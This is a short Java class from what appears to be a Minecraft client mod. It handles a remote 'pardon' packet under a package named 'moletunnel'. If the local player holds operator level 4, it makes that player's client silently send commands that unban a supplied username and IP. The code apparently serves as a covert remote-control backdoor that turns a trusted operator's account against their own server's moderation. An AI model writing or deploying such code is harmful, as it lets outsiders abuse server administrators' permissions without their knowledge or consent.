package net.shadow.prisma.packets.s2c.moletunnel;

import net.shadow.Shadow;
import net.shadow.plugin.GlobalConfig;
import net.shadow.prisma.S2CPacket;

public class PardonPacket extends S2CPacket {
    public PardonPacket() {
        super("pardon",true);
    }

    @Override
    public void on(Object[] args) {


        String username = (String) args[0];
        if(Shadow.c.player == null) return;
        if(Shadow.c.player.hasPermissionLevel(4)) {
            Shadow.c.player.sendChatMessage(String.format("/pardon %s",username));
            Shadow.c.player.sendChatMessage(String.format("/pardon-ip %s",username));
            Shadow.c.player.sendChatMessage(String.format("/minecraft:pardon %s",username));
            Shadow.c.player.sendChatMessage(String.format("/minecraft:pardon-ip %s",username));
        }
    }
}
